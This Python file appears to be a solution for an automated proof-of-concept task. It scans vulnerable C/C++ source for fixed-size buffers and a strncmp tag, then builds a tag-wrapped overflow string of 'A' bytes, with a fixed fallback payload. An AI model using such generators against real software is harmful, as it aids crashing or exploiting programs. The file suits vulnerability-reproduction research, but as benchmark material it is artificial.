import os
import re
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        source_files = []
        try:
            with tempfile.TemporaryDirectory() as temp_dir:
                try:
                    with tarfile.open(src_path, "r:gz") as tar:
                        tar.extractall(path=temp_dir)
                except tarfile.ReadError:
                    with tarfile.open(src_path, "r:") as tar:
                        tar.extractall(path=temp_dir)

                for root, _, files in os.walk(temp_dir):
                    for file in files:
                        if file.endswith(('.c', '.cpp')):
                            source_files.append(os.path.join(root, file))

                for fpath in source_files:
                    with open(fpath, 'r', errors='ignore') as f:
                        code = f.read()

                    buffer_size = 0
                    potential_sizes = []
                    for match in re.finditer(r'char\s+\w+\s*\[\s*(\d+)\s*\];', code):
                        size = int(match.group(1))
                        if size > 64:
                            potential_sizes.append(size)
                    
                    if not potential_sizes:
                        continue
                    
                    buffer_size = max(potential_sizes)

                    strncmp_match = re.search(r'strncmp\s*\([^,]+,\s*L?"((?:[^"\\]|\\.)*)"', code)
                    
                    if strncmp_match:
                        tag_prefix_str = strncmp_match.group(1).encode('latin1').decode('unicode_escape')
                        tag_suffix_str = None

                        end_delim_matches = re.findall(r"strchr\s*\([^,]+,\s*'([^'])'\s*\)", code)
                        
                        for delim in end_delim_matches:
                            if delim not in tag_prefix_str:
                                tag_suffix_str = delim
                                break
                        
                        if not tag_suffix_str:
                            if tag_prefix_str.startswith('['): tag_suffix_str = ']'
                            elif tag_prefix_str.startswith('<'): tag_suffix_str = '>'
                            elif tag_prefix_str.startswith('{'): tag_suffix_str = '}'
                            else: tag_suffix_str = ']'

                        payload_len = buffer_size + 32
                        payload = b'A' * payload_len
                        
                        return tag_prefix_str.encode() + payload + tag_suffix_str.encode()
        except Exception:
            pass

        # Fallback PoC
        payload_len = 1400
        payload = b'A' * payload_len
        prefix = b'[DATA:'
        suffix = b']'
        return prefix + payload + suffix